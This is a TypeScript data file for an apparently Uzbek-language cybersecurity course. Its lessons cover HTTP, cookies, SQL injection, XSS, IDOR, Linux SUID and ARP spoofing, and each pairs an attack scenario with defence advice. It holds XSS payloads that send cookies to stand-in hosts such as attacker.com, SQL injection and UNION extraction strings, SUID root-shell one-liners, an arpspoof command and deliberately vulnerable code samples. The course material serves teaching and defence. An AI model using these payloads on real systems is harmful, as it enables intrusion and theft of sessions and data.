export interface LessonData {
  slug: string;
  title: string;
  duration: string;
  xp: number;
  summary: string;
  content: {
    overview: string;
    keyConcepts: Array<{ term: string; definition: string }>;
    codeExample?: {
      language: string;
      title: string;
      code: string;
      explanation: string;
    };
    attackScenario?: {
      title: string;
      steps: string[];
      samplePayload: string;
    };
    defenseRecommendations: string[];
  };
}

export interface ModuleData {
  slug: string;
  title: string;
  description: string;
  lessons: LessonData[];
}

export interface CourseData {
  slug: string;
  title: string;
  description: string;
  level: 'BEGINNER' | 'INTERMEDIATE' | 'ADVANCED' | 'EXPERT';
  hours: number;
  prerequisites: string[];
  modules: ModuleData[];
}

export interface PathData {
  slug: string;
  title: string;
  subtitle: string;
  description: string;
  level: 'BEGINNER' | 'INTERMEDIATE' | 'ADVANCED';
  hours: number;
  coursesCount: number;
  badgeColor: string;
  iconName: string;
  skills: string[];
  courses: CourseData[];
}

export const CURRICULUM_DATA: Record<string, PathData> = {
  'web-pentest': {
    slug: 'web-pentest',
    title: 'Web Pentest & OWASP Top 10',
    subtitle: 'Veb ilovalar zaifliklarini professional aniqlash va xavfsizligini ta\'minlash',
    description: 'Hozirgi kunda dunyodagi kiber-hujumlarning 80% dan ortig\'i veb-ilovalarga qaratilgan. Ushbu yo\'nalishda siz HTTP protokolidan boshlab, SQL Injection, XSS, SSRF, IDOR va API xavfsizligini real laboratoriyalarda o\'rganasiz.',
    level: 'INTERMEDIATE',
    hours: 80,
    coursesCount: 4,
    badgeColor: 'border-cyan-500/30 text-cyan-400 bg-cyan-500/10',
    iconName: 'Globe',
    skills: ['SQL Injection', 'XSS Exploitation', 'IDOR / BOLA', 'SSRF', 'Burp Suite', 'OWASP Top 10', 'API Hacking'],
    courses: [
      {
        slug: 'http-web-architecture',
        title: 'HTTP Protokoli & Web Arxitekturasi Xavfsizligi',
        description: 'Veb qanday ishlashini bilmasdan uni himoya qilib bo\'lmaydi. HTTP so\'rovlar, javoblar, cookie-lar, sessiyalar va xavfsizlik sarlavhalari (headers).',
        level: 'BEGINNER',
        hours: 12,
        prerequisites: ['HTML va JavaScript asoslari', 'Umumiy tarmoq tushunchalari'],
        modules: [
          {
            slug: 'http-fundamentals',
            title: '1-Modul: HTTP/HTTPS So\'rov va Javoblar Tuzilishi',
            description: 'HTTP so\'rov metodlari (GET, POST, PUT, DELETE), headerlar va status kodlarining xavfsizlikdagi roli.',
            lessons: [
              {
                slug: 'http-request-response',
                title: '1.1. HTTP So\'rov va Javob Anatomiyasi',
                duration: '25 daqiqa',
                xp: 50,
                summary: 'Mijoz va server o\'rtasidagi matnli muloqot protokoli va xavfsizlikka ta\'sir etuvchi parametrlar.',
                content: {
                  overview: 'HTTP (Hypertext Transfer Protocol) — vebning asosi bo\'lib, u client-server arxitekturasida ishlaydi. Pentestingda biz brauzer yuborayotgan har bir baytni tahlil qilamiz va server unga qanday javob qaytarishini nazorat qilamiz.',
                  keyConcepts: [
                    { term: 'HTTP Request Line', definition: 'Metod (GET/POST), manzil (URI) va protokol versiyasini o\'z ichiga olgan birinchi qator.' },
                    { term: 'Headers (Sarlavhalar)', definition: 'Host, User-Agent, Cookie, Content-Type kabi mijoz va server haqidagi metadata ma\'lumotlar.' },
                    { term: 'Status Kodlari', definition: '200 (Muvaffaqiyat), 301/302 (Yo\'naltirish), 401/403 (Ruxsat yo\'q), 500 (Server ichki xatosi).' },
                  ],
                  codeExample: {
                    language: 'http',
                    title: 'Xavfsiz HTTP So\'rov Namunasi (Raw Request)',
                    code: `POST /api/v1/auth/login HTTP/1.1\nHost: target.cybertrip.uz\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nContent-Type: application/json\nContent-Length: 48\nX-Requested-With: XMLHttpRequest\n\n{\n  "email": "student@test.uz",\n  "password": "SecretPassword123!"\n}`,
                    explanation: 'Ushbu so\'rov JSON formatida ma\'lumot uzatadi. Pentester so\'rovdagi Content-Type va parametrlarni manipulyatsiya qilish orqali zaifliklarni aniqlaydi.'
                  },
                  attackScenario: {
                    title: 'HTTP Header Injection & Verb Tampering',
                    steps: [
                      'Admin panel faqat POST so\'rovlarini tekshiradigan qilib sozlangan bo\'lsa, hujumchi so\'rov metodini GET yoki HEAD ga o\'zgartirib avtorizatsiyani chetlab o\'tishga harakat qiladi.',
                      'X-Forwarded-For sarlavhasiga 127.0.0.1 kiritish orqali ichki tarmoq foydalanuvchisi sifatida o\'zini ko\'rsatadi.'
                    ],
                    samplePayload: 'X-Forwarded-For: 127.0.0.1\nX-Original-URL: /admin/dashboard'
                  },
                  defenseRecommendations: [
                    'Barcha HTTP so\'rov metodlarini server darajasida qat\'iy filtrlash (faqat kerakli metodlarga ruxsat berish).',
                    'Faqatgina ishonchli ichki proksi orqali kelgan X-Forwarded-* sarlavhalariga tayanish.',
                    'Hamma joyda HTTPS va HSTS (HTTP Strict Transport Security) sarlavhasini majburiy yoqish.'
                  ]
                }
              },
              {
                slug: 'cookies-and-sessions',
                title: '1.2. Cookie, Sessiyalar va Tokenlar Xavfsizligi',
                duration: '30 daqiqa',
                xp: 60,
                summary: 'HttpOnly, Secure, SameSite bayroqlari va sessiyalarni o\'g\'irlashdan himoyalash.',
                content: {
                  overview: 'HTTP protokoli holatsiz (stateless) bo\'lgani sababli, foydalanuvchi tizimga kirganini eslab qolish uchun Cookie va Sessiyalar ishlatiladi. Agar cookie to\'g\'ri himoyalanmasa, tajovuzkor uni o\'g\'irlab foydalanuvchi hisobiga kira oladi.',
                  keyConcepts: [
                    { term: 'HttpOnly Flag', definition: 'JavaScript (document.cookie) ushbu cookie-faylni o\'qiy olmasligini ta\'minlaydi. Bu XSS orqali sessiyani o\'g\'irlashdan saqlaydi.' },
                    { term: 'Secure Flag', definition: 'Cookie faqatgina shifrlangan HTTPS ulanishi orqali uzatilishini talab qiladi.' },
                    { term: 'SameSite (Strict / Lax)', definition: 'Cookie-fayllarni uchinchi tomon saytlari orqali so\'rov yuborilganda uzatilishini cheklaydi (CSRF himoyasi).' }
                  ],
                  codeExample: {
                    language: 'http',
                    title: 'Xavfsiz Set-Cookie Sarlavhasi',
                    code: `Set-Cookie: session_id=q98f4h1029hf...; Path=/; Secure; HttpOnly; SameSite=Strict; Max-Age=3600`,
                    explanation: 'Ushbu sarlavha orqali o\'rnatilgan sessiya cookie-si XSS orqali o\'g\'irlanmaydi (HttpOnly), ochiq Wi-Fi da tutib olinmaydi (Secure) va boshqa saytdan so\'rov yuborilganda yuborilmaydi (SameSite=Strict).'
                  },
                  attackScenario: {
                    title: 'Session Hijacking (Sessiyani o\'g\'irlash)',
                    steps: [
                      'Saytda HttpOnly bayrog\'i bo\'lmagan zaif cookie aniqlanadi.',
                      'XSS orqali brauzerda <script>document.location="http://attacker.com/?c="+document.cookie</script> kodi bajariladi.',
                      'Hujumchi olingan sessiya id orqali qurbonning parolini bilmasdan tizimga kiradi.'
                    ],
                    samplePayload: 'document.location="http://attacker.com/steal?c=" + encodeURIComponent(document.cookie);'
                  },
                  defenseRecommendations: [
                    'Barcha autentifikatsiya cookie-lariga doimo HttpOnly va Secure bayroqlarini qo\'yish.',
                    'Parol o\'zgarganda yoki foydalanuvchi tizimdan chiqqanda eski sessiya tokenini ma\'lumotlar bazasida bekor qilish (Revoke).',
                    'Sessiya muddati tugash vaqtini (Absolute Timeout: 12 soat, Inactivity: 15 daqiqa) joriy etish.'
                  ]
                }
              }
            ]
          }
        ]
      },
      {
        slug: 'sql-injection',
        title: 'SQL Injection (SQLi) Chuqur Tahlili',
        description: 'Veb ilovalarning ma\'lumotlar bazasiga to\'g\'ridan-to\'g\'ri buyruq kiritish zaifligi: In-band (UNION, Error), Blind (Boolean, Time-based).',
        level: 'INTERMEDIATE',
        hours: 24,
        prerequisites: ['SQL so\'rovlar tili (SELECT, WHERE, JOIN)', 'HTTP protokoli'],
        modules: [
          {
            slug: 'sqli-basics-union',
            title: '1-Modul: Error-based & UNION Injection Hujumlari',
            description: 'SQL sintaksisini buzish, ustunlar sonini aniqlash va UNION yordamida jadval ma\'lumotlarini tortib olish.',
            lessons: [
              {
                slug: 'sqli-mechanics',
                title: '2.1. SQL Injection Mexanikasi va Sintaksis Buzish',
                duration: '35 daqiqa',
                xp: 75,
                summary: 'SQL so\'rov mantiqini manipulyatsiya qilish, bitta qo\'shtirnoq va sharh belgilarining ishlashi.',
                content: {
                  overview: 'SQL Injection — foydalanuvchi kiritgan ma\'lumotlar to\'g\'ridan-to\'g\'ri SQL query bilan birlashtirilganda (concatenation) yuzaga keladi. Bu hujumchi bazaga o\'zboshimchalik bilan SQL buyruqlarini yuborish imkonini beradi.',
                  keyConcepts: [
                    { term: 'SQL Concatenation Zaifligi', definition: '"SELECT * FROM books WHERE name = \'" + userInput + "\'" — eng xavfli yondashuv.' },
                    { term: 'Comment Out (-- yoki #)', definition: 'SQL so\'rovining qolgan qismini inkor qilish va sintaksis xatosini chetlab o\'tish usuli.' },
                    { term: 'Tautology (\' OR 1=1 --)', definition: 'Har doim ROST (true) qiymat qaytaruvchi shart orqali barcha qatorlarni chiqarib olish.' }
                  ],
                  codeExample: {
                    language: 'sql',
                    title: 'Zaif vs Xavfsiz Kod Namunasi (Node.js PostgreSQL)',
                    code: `// ❌ ZAIF KOD:\nconst query = \`SELECT * FROM users WHERE email = '\${req.body.email}' AND password = '\${req.body.password}'\`;\nawait db.query(query);\n\n// ✅ XAVFSIZ KOD (Parameterized Query):\nconst safeQuery = 'SELECT * FROM users WHERE email = $1 AND password = $2';\nawait db.query(safeQuery, [req.body.email, req.body.password]);`,
                    explanation: 'Parametrlangan so\'rovda ma\'lumotlar bazasi foydalanuvchi kiritmasini buyruq sifatida emas, shunchaki sof matnli qiymat sifatida qabul qiladi.'
                  },
                  attackScenario: {
                    title: 'Login Formasini Parolsiz Chetlab O\'tish (Auth Bypass)',
                    steps: [
                      'Login maydoniga: admin\' OR 1=1 -- kiritiladi.',
                      'Server quyidagi so\'rovni bajaradi: SELECT * FROM users WHERE email = \'admin\' OR 1=1 --\' AND password = \'...\'',
                      'Natijada 1=1 sharti tufayli server parolni tekshirmasdan admin profiliga kirishga ruxsat beradi.'
                    ],
                    samplePayload: "admin' OR 1=1 --"
                  },
                  defenseRecommendations: [
                    'Hech qachon foydalanuvchi kiritmasini SQL so\'rovi matniga qo\'shmang (string concatenation taqiqlanadi).',
                    'Doimo Prepared Statements (Tayyorlangan so\'rovlar) va ORM (Prisma, TypeORM, Hibernate) dan to\'g\'ri foydalaning.',
                    'Baza foydalanuvchisiga eng kam huquqlar (Least Privilege) printsipini qo\'llang.'
                  ]
                }
              },
              {
                slug: 'union-based-sqli',
                title: '2.2. UNION Injection Orqali Bazani Tortib Olish',
                duration: '40 daqiqa',
                xp: 100,
                summary: 'ORDER BY orqali ustunlar sonini aniqlash, ma\'lumot turlarini moslash va butun schema strukturasini o\'qish.',
                content: {
                  overview: 'UNION operatori ikki yoki undan ortiq SELECT natijalarini bitta javobga birlashtirishga imkon beradi. Buning uchun asosiy so\'rovdagi ustunlar soni va ularning ma\'lumot turlari (types) teng bo\'lishi shart.',
                  keyConcepts: [
                    { term: 'ORDER BY n', definition: 'Ustunlar sonini aniqlash usuli. Agar ORDER BY 4 ishlasa va ORDER BY 5 xatolik bersa, ustunlar soni 4 ta.' },
                    { term: 'UNION SELECT null, null, null', definition: 'Mos keluvchi ustunlarni xatoliksiz aniqlash uchun universal null qiymatlaridan foydalanish.' },
                    { term: 'information_schema', definition: 'Barcha jadvallar (tables) va ustunlar (columns) nomlari saqlanadigan standart SQL metama\'lumotlar katalogi.' }
                  ],
                  codeExample: {
                    language: 'sql',
                    title: 'Database Schema va Foydalanuvchilarni Ekstraktsiya Qilish',
                    code: `-- 1. Jadvallar ro'yxatini olish:\n' UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema='public' --\n\n-- 2. Users jadvalidagi ustunlarni aniqlash:\n' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name='users' --\n\n-- 3. Parol xeshlarini chiqarib olish:\n' UNION SELECT id, username, password_hash FROM users --`,
                    explanation: 'Ushbu uch bosqich orqali tajovuzkor bazaning to\'liq xaritasini tuzib, maxfiy foydalanuvchilar jadvalini ko\'chirib oladi.'
                  },
                  attackScenario: {
                    title: 'Mahsulotlar Qidiruvidan Foydalanib Parollarni O\'g\'irlash',
                    steps: [
                      'Mahsulot qidiruvida ustunlar soni aniqlanadi: \' ORDER BY 3 --',
                      'Matn aks ettiriladigan ustun topiladi: \' UNION SELECT \'a\', \'b\', \'c\' --',
                      'O\'sha ustun o\'rniga version() yoki users jadvalidan parollar chiqariladi.'
                    ],
                    samplePayload: "' UNION SELECT 1, concat(username, ':', password), 3 FROM users --"
                  },
                  defenseRecommendations: [
                    'Ma\'lumotlar bazasida xatolik xabarlarini (Database error stack trace) mijozga ko\'rsatmaslik.',
                    'Prepared statement orqali qidiruv parametrlarini xavfsiz bog\'lash.',
                    'WAF (Web Application Firewall) orqali UNION SELECT naqshlarini bloklash (qo\'shimcha himoya qatlami sifatida).'
                  ]
                }
              }
            ]
          }
        ]
      },
      {
        slug: 'xss',
        title: 'Cross-Site Scripting (XSS) To\'liq Kursi',
        description: 'Mijoz brauzerida zararli JavaScript kodini bajarish: Reflected, Stored, DOM-based zaifliklar va Content Security Policy (CSP).',
        level: 'INTERMEDIATE',
        hours: 18,
        prerequisites: ['HTML DOM tuzilishi', 'JavaScript asoslari'],
        modules: [
          {
            slug: 'xss-types',
            title: '1-Modul: XSS Turlari va Hujum Vektorlari',
            description: 'Reflected, Stored va DOM XSS o\'rtasidagi farqlar, brauzer konteksti va filtrlarni chetlab o\'tish.',
            lessons: [
              {
                slug: 'stored-and-reflected-xss',
                title: '3.1. Reflected va Stored XSS Hujumlari',
                duration: '30 daqiqa',
                xp: 80,
                summary: 'Server kiritmani filtrsiz qaytarganda yoki bazaga saqlab barcha foydalanuvchilarga tarqatganda sodir bo\'ladigan kiber-tahdid.',
                content: {
                  overview: 'XSS zaifligi paydo bo\'lishiga sabab — veb ilova foydalanuvchi kiritgan ma\'lumotni ishonchli deb hisoblab, uni HTML sahifaga kontekstual xavfsizlantirmasdan (HTML escaping) chiqarishidir.',
                  keyConcepts: [
                    { term: 'Reflected XSS', definition: 'Zararli payload URL parametrida bo\'ladi va faqat o\'sha havolani ochgan jabrlanuvchiga ta\'sir qiladi.' },
                    { term: 'Stored XSS (Persistent)', definition: 'Zararli skript ma\'lumotlar bazasiga (izohlar, profil nomi) saqlanadi va sahifani ochgan har bir kishining brauzerida ishga tushadi.' },
                    { term: 'DOM-based XSS', definition: 'Zaiflik butunlay mijoz tomonidagi JavaScript kodida bo\'ladi (location.hash, innerHTML).' }
                  ],
                  codeExample: {
                    language: 'html',
                    title: 'Zaif va Himoyalangan React/HTML Chiqarishi',
                    code: `<!-- ❌ ZAIF: HTML teg sifatida qabul qiladi -->\n<div dangerouslySetInnerHTML={{ __html: userComment }} />\n\n<!-- ✅ XAVFSIZ: React avtomatik tarzda barcha belgilarni (<, >, &) xavfsiz matnga aylantiradi -->\n<div>{userComment}</div>`,
                    explanation: 'Zamonaviy karkaslar (React, Next.js, Vue) o\'z-o\'zidan matnni xavfsizlantiradi, biroq innerHTML yoki href="javascript:..." kabi joylarda ehtiyotsizlik XSS keltirib chiqaradi.'
                  },
                  attackScenario: {
                    title: 'Forumda Admin Sessiyasini O\'g\'irlash (Stored XSS)',
                    steps: [
                      'Hujumchi forum izohida quyidagi kodni qoldiradi: <script>new Image().src="http://hacker.uz/log?t="+document.cookie</script>',
                      'Administrator ushbu izohni moderatsiya qilish uchun sahifani ochadi.',
                      'Admin brauzerida skript ishlab, maxfiy admin tokenini xaker serveriga jo\'natadi.'
                    ],
                    samplePayload: "<img src=x onerror=\"fetch('http://attacker.com/steal?c='+document.cookie)\">"
                  },
                  defenseRecommendations: [
                    'Context-Aware Output Encoding (HTML entity, JavaScript string, URL parameter kontekstiga qarab kodlash).',
                    'Qattiq Content Security Policy (CSP) sarlavhasini joriy etish (script-src \'self\').',
                    'Sessiya cookie-fayllariga HttpOnly bayrog\'ini belgilash.'
                  ]
                }
              }
            ]
          }
        ]
      },
      {
        slug: 'auth-security',
        title: 'IDOR / BOLA va Avtorizatsiya Zaifliklari',
        description: 'Boshqa foydalanuvchilarning hisoblari, fayllari va buyurtmalariga ruxsatsiz kirish: Broken Object Level Authorization.',
        level: 'ADVANCED',
        hours: 20,
        prerequisites: ['REST API tushunchasi', 'JWT va Bearer Tokenlar'],
        modules: [
          {
            slug: 'idor-mechanics',
            title: '1-Modul: IDOR Mexanikasi va API Tekshiruvlari',
            description: 'Sonli yoki UUID identifikatorlar orqali boshqa mijoz ma\'lumotlariga ruxsatsiz kirish.',
            lessons: [
              {
                slug: 'idor-exploitation-defense',
                title: '4.1. IDOR Zaifliklarini Aniqlash va Himoyalash',
                duration: '35 daqiqa',
                xp: 90,
                summary: 'Mijoz identifikatori URL yoki so\'rov tanasida kelganda, server sessiya egasini tekshirmasligi oqibatlari.',
                content: {
                  overview: 'IDOR (Insecure Direct Object References) — OWASP API Security reytingida №1 o\'rinda turuvchi zaiflik. Dasturchi foydalanuvchi so\'ragan obyekt (fayl, shartnoma, profil) aynan o\'sha foydalanuvchiga tegishli ekanligini serverda tekshirishni unutganda yuzaga keladi.',
                  keyConcepts: [
                    { term: 'Object ID Manipulation', definition: 'URL yoki API dagi /api/documents/1042 ni /api/documents/1001 ga almashtirish.' },
                    { term: 'Mass Assignment', definition: 'Foydalanuvchi profilini yangilashda { role: "ADMIN" } parametrini qo\'shimcha jo\'natib huquqni oshirish.' },
                    { term: 'Horizontal vs Vertical Privilege Escalation', definition: 'O\'z darajasidagi boshqa odam hisobiga kirish (Gorizontal) yoki oddiy foydalanuvchidan Adminga aylanish (Vertikal).' }
                  ],
                  codeExample: {
                    language: 'typescript',
                    title: 'Zaif vs Xavfsiz Controller Kodingi (NestJS / Prisma)',
                    code: `// ❌ ZAIF: Har kim istalgan ID dagi hujjatni ko'ra oladi\n@Get(':id')\nasync getDoc(@Param('id') id: string) {\n  return this.prisma.document.findUnique({ where: { id } });\n}\n\n// ✅ XAVFSIZ: Faqat joriy tizimga kirgan foydalanuvchining hujjati chiqadi\n@Get(':id')\nasync getDocSafe(@Param('id') id: string, @CurrentUser() user: User) {\n  const doc = await this.prisma.document.findFirst({\n    where: { id, userId: user.id }\n  });\n  if (!doc) throw new NotFoundException('Hujjat topilmadi yoki ruxsat yo\\'q');\n  return doc;\n}`,
                    explanation: 'Xavfsiz variantda so\'rov doimo joriy tasdiqlangan foydalanuvchining ID-si (user.id) bilan cheklanadi.'
                  },
                  attackScenario: {
                    title: 'Bank Billing Tizimida Boshqa Mijoz Karta Ma\'lumotlarini Ko\'rish',
                    steps: [
                      'Foydalanuvchi o\'z hisobini ochadi: GET /api/cards/84920',
                      'Burp Suite orqali raqamni birma-bir o\'zgartirib skanerlaydi (84921, 84922...)',
                      'Server tekshiruvsiz boshqa barcha mijozlarning balanslarini qaytaradi.'
                    ],
                    samplePayload: 'GET /api/v1/invoices/INV-2024-001 HTTP/1.1\nAuthorization: Bearer <Victim_Or_Attacker_Token>'
                  },
                  defenseRecommendations: [
                    'Server darajasida har bir obyektga kirishdan oldin egalik huquqini (Ownership Check) majburiy tekshirish.',
                    'Ketma-ket keluvchi sonli ID-lar (1, 2, 3) o\'rniga taxmin qilib bo\'lmaydigan UUID v4 yoki CUID lardan foydalanish.',
                    'RBAC (Role Based Access Control) va ABAC (Attribute Based Access Control) mexanizmlarini qo\'llash.'
                  ]
                }
              }
            ]
          }
        ]
      }
    ]
  },
  'linux-security': {
    slug: 'linux-security',
    title: 'Linux va Tizim Xavfsizligi',
    subtitle: 'Server operatsion tizimlari, buyruqlar qobig\'i va xavfsizlik auditi',
    description: 'Serverlarning 90% qismi Linuxda ishlaydi. Ushbu yo\'nalishda siz Bash buyruqlari, fayl huquqlari, SUID bitlari va tizimda huquqlarni oshirishni (Privilege Escalation) o\'rganasiz.',
    level: 'BEGINNER',
    hours: 45,
    coursesCount: 2,
    badgeColor: 'border-yellow-500/30 text-yellow-400 bg-yellow-500/10',
    iconName: 'Terminal',
    skills: ['Bash Scripting', 'Linux Permissions', 'SUID / SGID Exploits', 'Cron Jobs', 'Server Hardening'],
    courses: [
      {
        slug: 'linux-fundamentals',
        title: 'Linux Asoslari & Buyruqlar Qobig\'i',
        description: 'Fayllar tizimi, navigatsiya, jarayonlar (processes) va tarmoq buyruqlari.',
        level: 'BEGINNER',
        hours: 20,
        prerequisites: ['Hech qanday boshlang\'ich bilim talab qilinmaydi'],
        modules: [
          {
            slug: 'linux-shell',
            title: '1-Modul: Terminal va Fayl Huquqlari',
            description: 'chmod, chown, SUID va /etc/passwd tahlili.',
            lessons: [
              {
                slug: 'file-permissions-suid',
                title: '1.1. Linuxda Fayl Huquqlari va SUID Zaifliklari',
                duration: '30 daqiqa',
                xp: 60,
                summary: 'rwx huquqlari, SUID biti orqali root darajasiga ko\'tarilish sirlari.',
                content: {
                  overview: 'Linux tizimida har bir fayl va buyruq egasi (User), guruhi (Group) va boshqalar (Others) uchun alohida ruxsatlarga ega. SUID (Set User ID) biti o\'rnatilgan fayllar oddiy foydalanuvchi tomonidan bajarilganda ham root huquqida ishga tushadi.',
                  keyConcepts: [
                    { term: 'rwx (Read, Write, Execute)', definition: 'Faylni o\'qish (4), o\'zgartirish (2) va bajarish (1) sonli qiymatlari.' },
                    { term: 'SUID Biti (4000)', definition: 'Fayl egasining ruxsati bilan ishga tushadigan maxsus bit (-rwsr-xr-x).' },
                    { term: '/etc/passwd va /etc/shadow', definition: 'Foydalanuvchilar ro\'yxati va shifrlangan parollar saqlanadigan asosiy tizim fayllari.' }
                  ],
                  codeExample: {
                    language: 'bash',
                    title: 'Tizimda SUID Fayllarni Qidirish Buyrug\'i',
                    code: `# Tizimdagi barcha SUID fayllarni topish va xatoliklarni yashirish:\nfind / -perm -u=s -type f 2>/dev/null\n\n# Masalan, find buyrug'ida SUID biti bo'lsa:\nfind . -exec /bin/sh -p \\; -quit`,
                    explanation: 'Agar noto\'g\'ri sozlangan yordamchi dasturda SUID biti bo\'lsa, hujumchi bir lahzada root huquqini qo\'lga kiritadi.'
                  },
                  attackScenario: {
                    title: 'SUID Biti Orqali Root Huquqini Qo\'lga Kiritish',
                    steps: [
                      'Tizimda oddiy foydalanuvchi sifatida `find / -perm -4000 2>/dev/null` buyrug\'i beriladi.',
                      'Natijada `/usr/bin/python3` faylida SUID biti borligi aniqlanadi.',
                      'Python orqali root shell chaqiriladi: `python3 -c "import os; os.execl(\'/bin/sh\', \'sh\', \'-p\')"`'
                    ],
                    samplePayload: 'python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"'
                  },
                  defenseRecommendations: [
                    'Tizimdagi barcha SUID/SGID bitlarini audit qilish va kerak bo\'lmaganlaridan olib tashlash (`chmod u-s /path/to/binary`).',
                    'Muhim tizim fayllariga (/etc/passwd, /etc/shadow) faqat root yozish huquqiga ega ekanligini doimiy tekshirish.',
                    'Auditd vositasi orqali privilegiyali buyruqlar bajarilishini jurnalga yozib borish.'
                  ]
                }
              }
            ]
          }
        ]
      }
    ]
  },
  'network-security': {
    slug: 'network-security',
    title: 'Tarmoq Xavfsizligi & Tahlil',
    subtitle: 'TCP/IP protokollari, Nmap, Wireshark va tarmoq hujumlarini aniqlash',
    description: 'Tarmoq qatlamidagi kiber-xavflarni tushunish, paketlarni tahlil qilish, portlarni skanerlash va Man-in-the-Middle hujumlaridan himoyalanish.',
    level: 'BEGINNER',
    hours: 35,
    coursesCount: 2,
    badgeColor: 'border-emerald-500/30 text-emerald-400 bg-emerald-500/10',
    iconName: 'Activity',
    skills: ['TCP/IP Stack', 'Wireshark Packet Analysis', 'Nmap Scanning', 'ARP Spoofing', 'Firewall Rules'],
    courses: [
      {
        slug: 'tcp-ip-analysis',
        title: 'TCP/IP Arxitekturasi & Paketlar Tahlili',
        description: '3 tomonlama qo\'l berish (3-way handshake), portlar va Wireshark orqali trafikni tekshirish.',
        level: 'BEGINNER',
        hours: 15,
        prerequisites: ['Umumiy IT tushunchalari'],
        modules: [
          {
            slug: 'packet-sniffing',
            title: '1-Modul: Tarmoq Paketlari va Protokollar',
            description: 'TCP, UDP, ICMP, DNS va shifrlanmagan protokollar tahlili.',
            lessons: [
              {
                slug: 'tcp-handshake-wireshark',
                title: '1.1. TCP 3-Way Handshake va Wireshark Tahlili',
                duration: '35 daqiqa',
                xp: 70,
                summary: 'SYN, SYN-ACK, ACK bosqichlari va tarmoqda shifrlanmagan parollarni tutib olish.',
                content: {
                  overview: 'TCP protokoli ishonchli ulanish o\'rnatish uchun har safar 3 tomonlama qo\'l berish jarayonini amalga oshiradi. Wireshark yordamida biz tarmoqdagi har bir paketni o\'rganishimiz mumkin.',
                  keyConcepts: [
                    { term: 'SYN -> SYN-ACK -> ACK', definition: 'Ulanishni boshlash, server roziligi va ulanish tasdiqlanishi.' },
                    { term: 'Unencrypted Traffic (HTTP, FTP, Telnet)', definition: 'Shifrlanmagan tarmoq oqimidan parollar toza matn ko\'rinishida o\'qib olinadi.' },
                    { term: 'Promiscuous Mode', definition: 'Tarmoq kartasining nafaqat o\'ziga, balki tarmoqdagi barcha boshqa kompyuterlarga tegishli paketlarni ham qabul qilish rejimi.' }
                  ],
                  codeExample: {
                    language: 'bash',
                    title: 'Tcpdump Orqali Tarmoq Trafikini Yozib Olish',
                    code: `# 80-portdagi barcha HTTP trafikni ASCII matn sifatida ko'rish:\nsudo tcpdump -i eth0 -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12:2]&0xf0)>>2)) != 0)'\n\n# Natijada so'rovdagi barcha parollar to'g'ridan-to'g'ri terminalda ko'rinadi!`,
                    explanation: 'Tcpdump yoki Wireshark tarmoqqa quloq soluvchi (sniffer) asosiy vositalar hisoblanadi.'
                  },
                  attackScenario: {
                    title: 'Mahalliy Tarmoqda (LAN) Parolni Tutib Olish (Sniffing)',
                    steps: [
                      'Hujumchi bitta Wi-Fi tarmog\'ida ARP Spoofing orqali trafikni o\'z kompyuteri orqali yo\'naltiradi.',
                      'Qurbon HTTP orqali ishlaydigan ichki tizimga kiradi.',
                      'Hujumchi Wiresharkda POST so\'rovidagi login va parolni ko\'rib oladi.'
                    ],
                    samplePayload: 'arpspoof -i wlan0 -t 192.168.1.50 192.168.1.1'
                  },
                  defenseRecommendations: [
                    'Tarmoqdagi barcha xizmatlarni faqat shifrlangan protokollarga (HTTPS, SSH, SFTP, TLS) ko\'chirish.',
                    'Tarmoq kommutatorlarida (Switches) Dynamic ARP Inspection (DAI) va Port Security-ni yoqish.',
                    'Korporativ tarmoqda 802.1X autentifikatsiyasini joriy etish.'
                  ]
                }
              }
            ]
          }
        ]
      }
    ]
  }
};
